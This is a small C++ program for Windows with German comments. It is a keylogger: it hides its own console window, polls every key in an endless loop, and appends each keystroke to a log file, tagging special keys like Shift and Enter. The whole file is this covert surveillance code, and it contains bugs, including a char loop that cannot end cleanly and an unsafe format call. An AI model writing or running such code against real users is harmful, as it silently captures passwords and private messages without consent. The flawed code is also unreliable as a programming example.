#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

int Save(int _key, char *file);

int main() //Hauptschleife
{
   FreeConsole(); //Fenster nicht sichtbar

    char i;

    while(true)
        {
        Sleep(10); //Macht das Programm schonender
        for (i=8; i <= 255; i++)
        if (GetAsyncKeyState(i) == -32767) //Überprüft ob eine Taste gedrückt wurde
            {
            Save(i,"log.txt"); //Datei in die gespeichert werden soll
            }
        }
        getchar(); //verhindert das sich das Programm schließt
    return 0;
}

int Save(int _key,char *file){

    cout << _key << endl; //Gibt gedrückte Taste als Zahl in der Console aus

    Sleep(10); //Macht das Programm schonender

    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+"); //Bereitet die Log-Datei zum schreiben vor

    if(_key == VK_SHIFT) //Vergleicht Tasten-zahl

        fprintf(OUTPUT_FILE,"%s", "[SHIFT]"); //wandelt Tasten-Zahl um und speichert es im Log

    else if (_key == VK_BACK)
        fprintf(OUTPUT_FILE,"%s", "[BACK]");

    else if(_key == VK_LBUTTON)
        fprintf(OUTPUT_FILE,"%s", "[LBUTTON]");

    else if(_key == VK_RETURN)
        fprintf(OUTPUT_FILE,"%s", "[RETURN]");

    else if(_key == VK_ESCAPE)
        fprintf(OUTPUT_FILE,"%s","[ESC]");

    else
    fprintf(OUTPUT_FILE, "%s", &_key); //wandelt Tasten-Zahl in
    fclose(OUTPUT_FILE); //schließt die Log-Datei

    return 0;
}
